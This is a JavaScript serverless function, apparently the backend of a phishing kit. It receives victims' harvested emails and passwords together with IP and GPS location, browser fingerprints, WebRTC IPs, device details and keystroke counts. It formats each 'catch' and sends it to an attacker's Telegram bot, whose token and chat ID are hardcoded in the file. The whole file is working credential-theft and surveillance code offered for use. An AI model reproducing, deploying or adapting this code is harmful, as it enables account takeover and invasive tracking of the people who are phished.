module.exports = async (req, res) => {
    const BOT_TOKEN = '8674321912:AAH9ncPM6rtU8cilPYiS_uR4ZZNZOxnLfRs';
    const CHAT_ID = '7607355489';

    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const data = req.body;
    const intel = data.intel || {};
    const session = data.session || {};

    // Server-side geo from Vercel headers
    const serverGeo = {
        ip: req.headers['x-forwarded-for']?.split(',')[0] || 'unknown',
        country: req.headers['x-vercel-ip-country'] || 'unknown',
        city: req.headers['x-vercel-ip-city'] || 'unknown',
        region: req.headers['x-vercel-ip-country-region'] || 'unknown',
        lat: req.headers['x-vercel-ip-latitude'] || 'unknown',
        lon: req.headers['x-vercel-ip-longitude'] || 'unknown',
        timezone: req.headers['x-vercel-ip-timezone'] || 'unknown'
    };

    // Parse user agent
    const ua = data.userAgent || '';
    const browser = ua.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[\d.]+/)?.[0] || 'Unknown';
    const os = ua.match(/\(([^)]+)\)/)?.[1]?.split(';')[0] || 'Unknown';

    // Format permissions
    const perms = intel.permissions || {};
    const grantedPerms = Object.entries(perms).filter(([k,v]) => v === 'granted').map(([k]) => k).join(', ') || 'none';
    const deniedPerms = Object.entries(perms).filter(([k,v]) => v === 'denied').map(([k]) => k).join(', ') || 'none';

    // Build message sections
    const sections = [];

    sections.push(`🎣 CATCH #${data.attemptNumber}`);
    sections.push(`━━━━━━━━━━━━━━━━━━━━`);
    sections.push(``);
    sections.push(`📧 CREDENTIALS`);
    sections.push(`Email: ${data.email}`);
    sections.push(`Pass: ${data.password}`);
    sections.push(``);
    sections.push(`🌍 LOCATION (Server)`);
    sections.push(`IP: ${serverGeo.ip}`);
    sections.push(`Country: ${serverGeo.country}`);
    sections.push(`City: ${serverGeo.city}`);
    sections.push(`Region: ${serverGeo.region}`);
    sections.push(`Coords: ${serverGeo.lat}, ${serverGeo.lon}`);
    sections.push(`Timezone: ${serverGeo.timezone}`);
    if (intel.latitude) {
        sections.push(``);
        sections.push(`📍 GPS (Client)`);
        sections.push(`Lat: ${intel.latitude}`);
        sections.push(`Lon: ${intel.longitude}`);
        sections.push(`Accuracy: ${intel.accuracy}m`);
    }
    sections.push(``);
    sections.push(`💻 DEVICE`);
    sections.push(`Browser: ${browser}`);
    sections.push(`OS: ${os}`);
    sections.push(`Platform: ${intel.platform}`);
    sections.push(`Vendor: ${intel.vendor}`);
    sections.push(`Screen: ${intel.screen}`);
    sections.push(`Avail: ${intel.availScreen}`);
    sections.push(`Pixel Ratio: ${intel.pixelRatio}`);
    sections.push(`Color Depth: ${intel.colorDepth}`);
    sections.push(`Orientation: ${intel.orientation}`);
    sections.push(`Cores: ${intel.cores}`);
    sections.push(`RAM: ${intel.memory}GB`);
    sections.push(`Battery: ${intel.batteryLevel} ${intel.batteryCharging ? '(charging)' : ''}`);
    sections.push(`Connection: ${intel.connectionType} / ${intel.downlink}Mbps / RTT ${intel.rtt}ms`);
    sections.push(`Save Data: ${intel.saveData ? 'ON' : 'OFF'}`);
    sections.push(`Touch Points: ${intel.touchPoints}`);
    sections.push(`Online: ${intel.onLine ? 'yes' : 'no'}`);
    sections.push(``);
    sections.push(`🔍 FINGERPRINT`);
    sections.push(`Canvas: ${intel.canvasHash}`);
    sections.push(`WebGL Vendor: ${intel.webGLVendor}`);
    sections.push(`WebGL Renderer: ${intel.webGLRenderer}`);
    sections.push(`Audio: ${intel.audioHash}`);
    sections.push(`Keyboard: ${intel.keyboardLayout}`);
    sections.push(`Timezone: ${intel.timezone}`);
    sections.push(`Languages: ${intel.languages?.join(', ')}`);
    sections.push(`Referrer: ${intel.referrer}`);
    sections.push(`External IP: ${intel.externalIP}`);
    sections.push(`WebRTC IPs: ${intel.webrtcIPs}`);
    sections.push(``);
    sections.push(`🔐 PERMISSIONS`);
    sections.push(`Granted: ${grantedPerms}`);
    sections.push(`Denied: ${deniedPerms}`);
    sections.push(``);
    sections.push(`📹 MEDIA`);
    sections.push(`Cameras: ${intel.cameraCount}`);
    sections.push(`Mics: ${intel.micCount}`);
    sections.push(`Devices: ${intel.mediaDevices}`);
    sections.push(``);
    sections.push(`💾 STORAGE`);
    sections.push(`Quota: ${intel.storageQuota}`);
    sections.push(`Usage: ${intel.storageUsage}`);
    sections.push(`JS Heap: ${intel.usedJSHeap}MB / ${intel.totalJSHeap}MB`);
    sections.push(``);
    sections.push(`📊 SESSION`);
    sections.push(`Duration: ${session.timeOnPage}`);
    sections.push(`Clicks: ${session.clicks}`);
    sections.push(`Keypresses: ${session.keypresses}`);
    sections.push(``);
    sections.push(`⏰ ${new Date(data.timestamp).toLocaleString()}`);

    const text = sections.join('\n');

    try {
        const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text
            })
        });

        const tgData = await tgRes.json();
        if (!tgData.ok) throw new Error(tgData.description);

        return res.status(200).json({ ok: true });
    } catch (err) {
        console.error('Telegram error:', err.message);
        return res.status(200).json({ ok: false, error: err.message });
    }
};
